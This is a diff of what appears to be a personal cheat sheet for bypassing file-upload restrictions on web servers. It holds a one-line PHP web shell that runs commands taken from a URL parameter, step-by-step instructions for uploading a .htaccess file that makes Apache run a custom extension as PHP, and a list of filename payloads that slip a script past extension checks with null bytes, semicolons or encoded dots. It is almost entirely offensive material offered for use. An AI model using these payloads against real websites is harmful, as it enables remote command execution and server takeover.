@@ -1,5 +1,22 @@
 payload :- <?php echo system($_GET['command']); ?>
 
+
+========================================
+===========================================
+If website is using apache server follow these steps:
+
+1: make a two requests
+for 1st req:
+    Change the value of the filename parameter to .htaccess.
+    Change the value of the Content-Type header to text/plain.
+    AddType application/x-httpd-php .lol
+for 2nd req:
+Filename:     exploit.lol
+Content-Type:     application/x-httpd-php
+
+============================================#########################===========================================
+
+payloads
 exploit.php%00.jpg --> use null byte
 exploit.asp;.jpg
 exploit%2Ephp
